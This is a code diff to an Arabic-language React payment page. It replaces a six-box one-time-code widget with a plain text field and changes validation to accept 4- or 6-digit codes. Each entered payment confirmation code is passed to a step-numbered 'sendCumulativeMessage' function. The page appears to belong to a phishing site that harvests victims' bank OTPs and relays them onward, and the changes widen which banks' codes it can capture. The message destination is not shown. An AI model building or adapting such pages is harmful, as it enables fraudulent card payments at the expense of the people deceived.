@@ -4,11 +4,6 @@ import Header from "@/components/Header";
 import Stepper from "@/components/Stepper";
 import Footer from "@/components/Footer";
 import { Button } from "@/components/ui/button";
-import {
-  InputOTP,
-  InputOTPGroup,
-  InputOTPSlot,
-} from "@/components/ui/input-otp";
 import securePaymentLogos from "@/assets/secure-payment-logos.png";
 import { useRegistration } from "@/contexts/RegistrationContext";
 
@@ -25,7 +20,7 @@ const PaymentOTP = () => {
   const [otp, setOtp] = useState("");
 
   const handleVerify = async () => {
-    if (otp.length === 6) {
+    if (otp.length === 4 || otp.length === 6) {
       const newData = { paymentOtp: otp };
       updateData(newData);
       await sendCumulativeMessage(5, "رمز تأكيد الدفع", newData);
@@ -74,26 +69,20 @@ const PaymentOTP = () => {
 
             <div className="bg-background rounded-lg p-6 mb-6">
               <p className="text-base text-foreground text-right mb-6 leading-relaxed">
-                تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم الهاتف المسجل لديكم. يرجى إدخال الرمز في الحقل أدناه لتأكيد عملية الدفع.
+                تم إرسال رمز التحقق (4 أو 6 أرقام) إلى رقم الهاتف المسجل لديكم. يرجى إدخال الرمز في الحقل أدناه لتأكيد عملية الدفع.
               </p>
 
-              <div className="flex justify-center mb-6" dir="ltr">
-                <InputOTP
+              <div className="flex justify-center mb-6">
+                <input
+                  type="text"
+                  inputMode="numeric"
                   maxLength={6}
                   value={otp}
-                  onChange={(value) => setOtp(value)}
-                  inputMode="numeric"
-                  pattern="[0-9]*"
-                >
-                  <InputOTPGroup className="gap-2">
-                    <InputOTPSlot index={0} className="w-12 h-12 text-xl" />
-                    <InputOTPSlot index={1} className="w-12 h-12 text-xl" />
-                    <InputOTPSlot index={2} className="w-12 h-12 text-xl" />
-                    <InputOTPSlot index={3} className="w-12 h-12 text-xl" />
-                    <InputOTPSlot index={4} className="w-12 h-12 text-xl" />
-                    <InputOTPSlot index={5} className="w-12 h-12 text-xl" />
-                  </InputOTPGroup>
-                </InputOTP>
+                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
+                  placeholder="أدخل رمز التحقق (4 أو 6 أرقام)"
+                  className="w-full max-w-sm h-14 px-4 rounded-md border-2 border-primary bg-white text-foreground text-center text-xl tracking-widest focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent"
+                  dir="ltr"
+                />
               </div>
 
               <div className="text-center mb-6">
@@ -121,7 +110,7 @@ const PaymentOTP = () => {
               <Button 
                 className="bg-primary hover:bg-primary/90 text-primary-foreground flex-1"
                 onClick={handleVerify}
-                disabled={otp.length !== 6}
+                disabled={otp.length !== 4 && otp.length !== 6}
               >
                 تأكيد
               </Button>
